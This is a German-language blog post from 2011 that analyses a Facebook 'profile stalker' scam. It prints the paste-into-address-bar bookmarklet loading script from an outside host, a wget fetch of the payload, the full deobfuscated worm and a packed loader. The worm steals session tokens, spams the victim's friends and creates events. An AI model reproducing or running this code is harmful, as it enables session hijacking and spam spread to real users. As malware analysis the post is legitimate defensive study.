Auf den Spuren von Facebook-"Viren"
#############################################
:date: 2011-04-27 01:50
:tags: bugs, de, facebook, reverse engineering, virus

Naja wirklich landen tut man dort nicht, denn man wird auf jedenfall zu
einem "Blog" weitergebracht. Dieser Blog beinhaltet Informationen wie
man "einfach" seine "Stalker" herrausfinden kann. 

|stalker-blog|

Das ganze ist denkbar einfach: man geht auf facebook, kopiert den Javascript der dort
bereit gestellt wird in seine Adresszeile:

.. code-block :: javascript

    javascript:(a=(b=document).createElement('script')).src='//iamedwards.com/german.php?'+Math.random(),b.body.appendChild(a);void(0)

und schon erfaehrt man alles ueber seine Stalker, so moechte man meinen.
Aber bei dieser Aktion passiert noch viel mehr. Was macht dieses kleine
Script ueberhaupt. Schluesseln wir es mal auf: Zuerst einmal sollte klar
sein, dass man ueber "javascript:" eigene Scripte auf die DOM-Elemente
der aktuell offenen Seite loslassen kann. document wird in der Variable
b abgespeichert. Daraufhin wird noch eine Hilfsvariable a angelegt, in
der ein neues "script"-Element steht. Dieses script Element bindet ein
externes Script von "http://iamedwards.com/german.php" ein. Interressant
ist hier auch die Zufallszahl von Math.random() als GET Uebergabe. Ich
weiss noch nicht in wie weit diese an Berechnungen innerhalb des
eingebundenen Scriptes mit beteiligt ist. Interressant ist zudem, wenn
nicht alle Parameter stimmen, man auf Google weitergeleitet wird.Wichtig
ist hierbei auch der Referer, der auf facebook.com angepasst werden
muss:

.. code-block :: bash

    21:55:27 seda:~/
    % wget --referer="http://facebook.com" "http://iamedwards.com/german.php?0.2344543643"

Was rausgeworfen wird ist ein wenig lang und moechte ich hier nur per
Link drauf verweisen: `http://pastebin.com/2LfCH2pr`_ Es ist nicht
schwer zu verstehen, nur schwer zu lesen, weil so komische
Variablennamen gewaehlt wurden wie: \_0x8a40, \_0x93d3xe... Wenigstens
haben sie sich an einen Stil gehalten :) Ok...es ist immer nicht ganz
leicht solchen miserablen Code aufzuraeumen, aber am besten faengt man
damit an die Variablen umzubenennen. Nachdem ich keine Ahnung hab, was
diese repraesentieren, nenn ich sie wie mir die Nase grad steht. Das
sollte den Code kuerzer machen und vorallem mehr lesbar. Wie euch ja
aufgefallen ist, ist das ganze auch in einer Zeile geschrieben.
Nunja...ich wuerde mal sagen: **Security by obscurity**. Das ist bei
JavaScript leider eigentlich inzwischen gang und gaebe. Zudem hab ich
die ganzen Hex Zeichen in dem angelegten Array \_0x8a40 in lesbare
Zeichen uebersetzt. Zum Glueck sehen Javascript Arrays wie Python Tuple
aus und man kann sie einfach weiterverwenden.

::

    data
    firstChild
    navAccountName
    getElementById
    ?
    /ajax/choose/?__a=1
    event
    AsyncRequest
    /ajax/typeahead/first_degree.php?__a=1&viewer=
    &token=
    &filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha
    length
    push
    getTime
    setTime
    getMonth
    getDate
    getFullYear
    getHours
    ,
    join

Ich denke dadurch kriegt man mal so einen Eindruck was da alles
drinsteht. Das sind alles Sachen, die spaeter im Code ersetzt wurden,
nur um ihn unlesbar zu machen (was ihnen ja auch gelungen ist) Demnach
hab ich das komplette Array \_0x8a40 aus dem Script genommen und alles
direkt eingetragen. Jetzt sieht das ganze schon lesbarer aus:
(entschuldigt fuer die riesen Tabs, bei mir sind die auf 2 leerzeichen
eingestellt, werden aber nicht durch whitespaces ersetzt) wer es nochmal
schoener Betrachten moechte sei hierhin verwiesen:
`http://pastebin.com/ZUNuYfWT`_

.. code-block :: javascript

    var chatmessage="%firstname% wow facebook kann dir jetzt anzeigen wer dein Profil ansieht! Schaus dir an @ ow.ly/4GpHi";
    var postmessage="Meine Top Profil-Stalker: %tf% - 1136 Besuche %tf% - 983 Besuche %tf% - 542 Besuche %tf% - 300 Besuche Schau dir an wer dein Profil sieht @ http://apps.facebook.com/seeyouuu/?o4sshg2m";
    var redirect="http://germancpa.blogspot.com/";
    var eventdesc="Schau dir deine Profil-Stalker an -  http://www.google.com/url?sa=t&source=web&cd=1&ved=0CBoQFjAA&url=http%3A%2F%2Fwho-spying-u.blogspot.com%2F&ei=SHO2TaAkiNiIAve95Sk&usg=AFQjCNH_JxkE7o8CvUwsLVUwr2eGGP4ecw&sig2=Ye1vqVHrMDHWkRv--npMkw?o4sshg2m ~~ o4sshg2m";
    var eventname="WOW Jetzt kannst du sehen wer sich dein Profil ansieht!   (o4sshg2m)";
    var nfriends=5000;
    var debug=false;
    var wf=0;
    var mf=function (){
        if(wf<=0){
            setTimeout(function (){
                window["top"]["location"]["href"]=redirect;
            } ,500);
        };
    };
    var doget=function (a,b,c){
        var e= new XMLHttpRequest();
        e["open"]("GET",a);
        e["onreadystatechange"]=function (){
            if(e["readyState"]==4){
                if(e["status"]==200&&b){
                    b(e["responseText"]);
                };
                if(c){
                    c();
                };
            };
        };
        e["send"]();
    } ;

    doget("/",function (f){
        var g=document["cookie"]["match"](/c_user=(\d+)/)[1];
        var h=function (i){ return i ? "@["+i["id"]+":"+i["name"]+"]":"";};
        var j=function (i){return i?i["name"]:"";} ;
        var k=function (i){
            out="";
            for(var l in i){
                out+=(out?"&":"")+l+((i[l]!==null)?"="+encodeURIComponent(i[l]):"");
            } ;
            return out;
        } ;
        var b=function (a,i,b,c){
            var e= new XMLHttpRequest();
            e["open"]("POST",a);
            e["setRequestHeader"]("Content-Type","application/x-www-form-urlencoded");
            e["onreadystatechange"]=function (){
                if(e["readyState"]==4){
                    if(e["status"]==200&&b){ b(e["responseText"]); } ;
                    if(c){ c(); } ;
                } ;
            } ;
            e["send"](k(i));
        } ;
        var m=function (){
            var e=document["createElement"]("div");
            e["style"]["display"]="block";
            e["style"]["position"]="absolute";
            e["style"]["width"]=100+"%";
            e["style"]["height"]=100+"%";
            e["style"]["left"]=0+"px";
            e["style"]["top"]=0+"px";
            e["style"]["textAlign"]="center";
            e["style"]["padding"]="4px";
            e["style"]["background"]="#FFFFFF";
            e["style"]["zIndex"]=999999;
            e["innerHTML"]=" Verifiziere deinen Code - Bitte gedulde dich einen kleinen Moment. We are processing the offer for you... click here";
            document["body"]["appendChild"](e);
        } ;
        var n=f["match"](/name=\\"xhpc_composerid\\" value=\\"([\d\w]+)\\"/i);
        if(n){ comp=n[1]; } else { comp=""; } ;
        var p=f["match"](/name="post_form_id" value="([\d\w]+)"/i)[1];
        var q=f["match"](/name="fb_dtsg" value="([\d\w]+)"/i)[1];
        var r=document["getElementById"]("navAccountName")["firstChild"]["data"];
        redirect=redirect+"?"+k({userid:g,name:r,doclose:1});
        m();
        if(eventdesc){
            wf++;
            b("/ajax/choose/?__a=1",{
                type:"event",
                eid:null,
                invite_message:"",
                __d:1,
                post_form_id:p,
                fb_dtsg:q,
                lsd:null,
                post_form_id_source:"AsyncRequest"
            },function (s){
                var t=s["match"](/\\"token\\":\\"([^\\]+)\\"/)[1];
                var a="/ajax/typeahead/first_degree.php?__a=1&viewer="+g+"&token="+t+"&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha";
                doget(a,function (u){
                    var v=u["match"](/\{"uid":\d+,/g);
                    var w=[];
                    for(var x=0;x/gi);
                    var ai=[];
                    if(v){
                        for(var x=0;x[^>]+\\u003c\\\/a>$/i)[0]["replace"](/\\u003c\\\/a>$/gim,"")["replace"](/>/g,"");
                            ai["push"]({id:y,name:al});
                        } ;
                    } ;
                    var c=[];
                    var aj=[];
                    while(ai["length"]){
                        var ak=Math["floor"](Math["random"]()*ai["length"]);
                        c["push"](ai[ak]);
                        aj["push"](ai[ak]);
                        var ag=ai["shift"]();
                        if(ak){ai[ak-1]=ag;
                    } ;
                } ;
                if(debug){
                    alert("fetched friends:"+c["length"]);
                } ;
                var am={
                    post_form_id:p,
                    fb_dtsg:q,
                    xhpc_composerid:comp,
                    xhpc_targetid:g,
                    xhpc_context:"home",
                    xhpc_fbx:"",
                    lsd:null,
                    post_form_id_source:"AsyncRequest"
                };
                mt=postmessage;
                m=postmessage;
                while(mt["search"]("%tf%")>=0){
                    var an=c["pop"]();
                    mt=mt["replace"]("%tf%",j(an));
                    m=m["replace"]("%tf%",h(an));
                } ;
                am["xhpc_message_text"]=mt;
                am["xhpc_message"]=m;
                if(debug){
                    alert("message text:"+mt);
                } ;
                b("/ajax/updatestatus.php?__a=1",am);
                var ao=function (l){
                    if(l==0){
                        wf=0;
                        mf();
                        return ;
                    } ;
                    var c=aj["shift"]();
                    var aq={
                        post_form_id:p,
                        fb_dtsg:q,
                        xhpc_composerid:comp,
                        xhpc_targetid:c["id"],
                        xhpc_context:"profile",
                        xhpc_fbx:1,
                        lsd:null,
                        post_form_id_source:"AsyncRequest"
                    };
                    var d=postmessage;
                    var ap=postmessage;
                    if(c["length"]==0){
                        wf=0;
                        mf();
                        return ;
                    } ;
                    while(d["search"]("%tf%")>=0){
                        var ar=c["pop"]();
                        d=d["replace"]("%tf%",j(ar));
                        ap=ap["replace"]("%tf%",h(ar));
                    } ;
                    aq["xhpc_message_text"]=d;
                    aq["xhpc_message"]=ap;
                    b("/ajax/updatestatus.php?__a=1",aq);
                    setTimeout(function (){ao(l-1);} ,2000);} ;
                    wf++;setTimeout(function (){ao(nfriends);} ,2000);
                } );
            } ;
            mf();
        } );

Doch was tut das ganze. (nachdem ich keine Codebeispiele rausnehme, weil
es den Text nur zusehr aufblaehen wuerde, ist es sinnvoll den Code
daneben zu halten oder in einem extra Fenster auf zu machen) Das ist
nicht so schwer zu erklaeren, aber etwas langwierig: Zeile 1-8 sind nur
festlegung verschiedenster Variablen, wie Chatmessages, Postmessages und
Redirect Seiten. Auch wird hier der Text fuer das Event eingestellt, das
generiert werden soll. Dann wird in Zeile 9 eine Funktion namens "mf"
definiert die genau diesen Redirect zur definierten Seite ausfuehrt.
Wenn eine Variable <=0 ist. Diese Variable wird im kompletten Script
immer wieder inkrementiert und dekrementiert. Auch wird die Funktion
ziemlich haeufig aufgerufen, ohne dass sie irgend etwas tut. Auch die
naechste Funktion, in Zeile 16 "doget", ist nur ein Hilfsfunktion. Hier
sieht man auch, dass die "Angreifer" sich nicht gross um Browser
Compatibilitaet gekuemmert haben. Es sollte aber in einem Grossteil
leider funktionieren. Der Funktion kann wiederum 2. andere Funktionen
uebergeben werden. Einerseits eine, die bei Success mit dem ResponseText
aufgerufen wird, und eine Funktion, wenn kein 200er Request
stattgefunden hat. In Zeile 32. springen wir auch schon ins Geschehen.
Es wird die Hauptseite von Facebook geholt, also http://facebook.com/.
Sogleich wird auf ein cookie geprueft (Z. 33) und einen bestimmten Wert
"c\_user" (ich denke es handelt sich hierbei um den Usernamen, oder ID)
herraus geholt. Danach legt er sich 5 Hilfsfunktionen an die im
einzelnen folgendes machen:

#. **h**: sie prueft ob i nicht leer ist, wenn nicht leer, gibt sie
   einen formatierten String in der Form: "@[id:name]". Fals aber leer,
   wird auch ein leerer String zurueckgegeben
#. **j**: siehe h: rueckgabe des Strings in Form: "name"
#. **k**: Annahme von i als array. (ich wusste garnicht, dass JS eine
   art foreach kann :) ). Die Funktion formatiert einen QueryString aus
   einem Array in der Form array(key=>element).
#. **b**: wieder eine Art doget, aber diesmal werden die Daten per Post
   uebermittelt. Diese Funktion hatte doget nicht. Eine gute Frage,
   warum sie nicht eine maechtige Funktion geschrieben habe :-/ (sie ist
   nahezu identisch zu doget)
#. **m**: sie generiert ein div-element und fuellt dieses mit diversen
   Style Eigenschaften. Dannwird noch ein Text ausgegeben, dass man sich
   Gedulden soll, mit einem lustigen Bild, dass von einem harvard server
   kommt. Zuletzt wird dieses div an den Body tag in der Facebook Seite
   gesetzt. Mit dem zIndex von 999.999 landet es garantiert ganz oben
   und nichts drunter ist mehr sichtbar.

In den Zeilen 70-73 sucht er sich aus dem DOM-Element einige Elemente
raus. Einerseits eine Art composerid (ich habe sie in meinem Quelltext
leider nicht gefunden und konnte sie nicht zuordnen). Diese muss aber
nicht zwingend existieren. Die anderen sind aber vorhanden:
post\_form\_id und fb\_dtsg. Bei der form\_id tippe ich auf eine Art id,
die festlegt, welches Form abgeschickt wird. Der Redirect wird neu
gesetzt um auch sicherzustellen, dass wenn es zu einem kommt, klar ist
von welchem Account mit welcher ID und welchem Namen gesendet wurde.
Danach wird die Funktion **m** aufgerufen. Fals ein Eventtext gesetzt
wurde (was in Zeile 77 geprueft wird) macht man sich dran einen POST
Request abzuschicken, um ein Event einzutragen. Leider kenn ich mich mit
der facebook API nicht so gut aus, dass ich da naeher erklaeren koennte
was dort passiert....aber es wird zumindest ein Event rausgeschrieben
mit einem Datum, dass 1000 Tage in der Zukunft liegt (Zeile 100).
Daraufhin wird geprueft ob eine Chatmessage gesetzt ist (Zeile 132).
Fals dies der Fall ist, wird sich die Buddy List geholt und an jeden
Benutzer der aktuell Verfuegbar ist eine Nachricht geschickt (die vorher
angegeben wird). Diese Nachricht ist ueber die Variable %firstname% an
den jeweiligen Benutzer angepasst. Identisch wird ab Zeile 162 mit
Postnachrichten verfahren. Bloss wird hierbei nicht drauf geachtet ob
derjenige Online ist oder nicht. Es werden einfach alle rausgesucht
(Zeile 164 - filter=all). Und die jeweilige Postnachricht wieder ueber
bekannte Ajax Technik verschickt. Interressant finde ich Zeile 184 und
206...anscheinend gab es in der Programmierung Probleme und es wurde
gedebugged. Die debug Ausgaben sind noch im "production" code vorhanden.
Staendig wird die Redirect Funktion aufgerufen. Aber es wird nur einen
Redirect geben, wenn eine Variable: naemlich wf unter null faellt oder
=0 ist. Das kann nur in einigen Faellen auftreten. Aber wirklich genau
drauf eingehen moechte ich auch nicht. Aber trotzdem ist die Seite zu
der Redirected wird noch interressant. Diese funktioniert auch nur, wenn
sie mit einem facebook.com Referer aufgerufen wird. Dort angekommen,
wird man von einem "Human Verification Check" begruesst, wie es meistens
der Fall ist. 

|image1|

Aber mich interressiert nicht wirklich wie das
ganze ausschaut, sondern vielmehr, was unter der Muetze steckt. Und da
haben wir auch gleich den Uebeltaeter gefunden: Ein grosser Button auf
dem "Click Here" Steht. Dahinter verbirgt sich eine Zip Datei mit. Und
in dieser Zip Datei, ist wiederum ein Bild gezippt: 

|spy|

Ich werde daraus nicht wirklich schlau...aber es muss wohl irgendwas mit dem Programm zu tun haben
\*achselzucken\* Zudem stellen sie immer sicher, dass JAvascript
aktiviert ist und auch kein Adblock einschalten ist:

.. code-block :: javascript

    var isloaded = false;if (!isloaded) { window.location = 'http://impressionvalue.mobi/abp'; }

Es wird eine Variable isloaded auf false gesetzt. Dann wird ein externes
Script geladen welches so aussieht:

.. code-block :: javascript

    eval(function(p,a,c,k,e,d){e=function(c){return(c35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('3 h=["\\6\\2\\1\\b\\7\\1\\5\\4\\6\\j\\d"];3 f=["\\d\\8\\i\\1\\9\\7\\o\\1\\8\\4\\2\\k\\2"];3 g=["\\2\\l\\a"];3 e=["\\i\\1\\9\\7\\m\\5"];3 n=["\\1\\5\\a\\b\\j\\6\\w\\4\\2\\k\\2"];p.D(z("%y B=\\"C/A\\" x=\\"r://"+h[0]+"/"+f[0]+"?"+g[0]+"=q&s;"+e[0]+"=t\\"%c%v/u%c"));',40,40,'|x61|x70|var|x2E|x64|x63|x65|x79|x74|x62|x6C|3E|x6D|g3909d93711e1c2ec49f5294bd1915e8c|m86f77129073c6c0dae7a7545e09157e7|p164a505b4127eb6748babbd88555e15b|cf7ed09726cefcccda7fc63312ccb77de|x67|x6F|x68|x75|x69|a23256111997cb2d310fc1d292215b1b5|x77|document|47931|http|amp|MTg0MDkz|script|3C|x6B|src|3Cscript|unescape|javascript|type|text|write'.split('|'),0,{}))

ich hab jetzt keine grossen Boecke das ganze zu Entschluesseln, aber ich
tippe drauf, dass er nichts anderes macht als die Moeglichkeiten des
Browsers zu testen. und wenn alles passt die Variable isloaded auf True
zu setzen. Fals das nicht der Fall sein sollte, wird man auf eine Seite
mit einer: "Bitte entfernen sie ihren Adblocker"-geleitet. Fals kein
Javascript aktiviert ist auf eine: "Bitte Javascript anschalten". Wer
lust hat, kann sich das ja mal genauer anschauen, was das Codestueck
genau macht... Zumindest sieht so ein Facebook-"Virus" aus. Der wirklich
einiges auf dem Kasten hat. Vom Zugriff auf den Internen Chat, bis hin
zur Erzeugung von Events. Auch der Zugriff auf die Benutzer ist nichts
neues. Mit Automatisch neu generierten Textnachrichten, einem Anschluss
zur bit.ly oder aehnlicher Link verkuerzungs API, koennte man damit
wirklich eine maechtige Waffe schaffen um facebook seiten ohne zutun,
nur mithilfe von Klicken und automatisch generierten Events zu crawlen.
Darueber kann ueber einen Benutzer alles herrausgefunden werden, weil
man auf seiner Session "surft". Die Frage was man damit anfangen soll
,stellt sich mir im ersten Moment. Aber bei weiterem Nachdenken, faellt
mir nur wieder Geld ein. Neuartiger Spam, empfohlene Produkte von
Freunden. Spam der noch um einiges Personalisierter ist. Einerseits
hoffe ich, dass ich in Zukunft mehr solcher Cross Site Scripting Attacks
sehe,um sie weiter zu analysieren und auf ihre Maechtigkeit zu pruefen.
Andererseits wuerde ich auch hoffen, dass es eingestellt wird, und von
facebook einen Riegel davor geschoben wird. so long ps.: alsich mir
spaeter nochmal die allererste Seite angeschaut haben, stand da ein
anderer link zu einer anderen Domain. Die scheinen die Wohl zu wechseln
wie ihre Unterhosen.

.. _`http://pastebin.com/2LfCH2pr`: http://pastebin.com/2LfCH2pr
.. _`http://pastebin.com/ZUNuYfWT`: http://pastebin.com/ZUNuYfWT

.. |stalker-blog| image:: http://nuit.homeunix.net/blag/wp-content/uploads/2011/04/2011-04-26-215444_1024x768_scrot-150x150.png
.. |image1| image:: http://nuit.homeunix.net/blag/wp-content/uploads/2011/04/2011-04-27-034601_1024x768_scrot-150x150.png
.. |spy| image:: http://nuit.homeunix.net/blag/wp-content/uploads/2011/04/spy-150x150.png
.. |image3| image:: http://nuit.homeunix.net/blag/wp-content/uploads/2011/04/2011-04-26-215444_1024x768_scrot-150x150.png
.. |image4| image:: http://nuit.homeunix.net/blag/wp-content/uploads/2011/04/2011-04-27-034601_1024x768_scrot-150x150.png
.. |image5| image:: http://nuit.homeunix.net/blag/wp-content/uploads/2011/04/spy-150x150.png
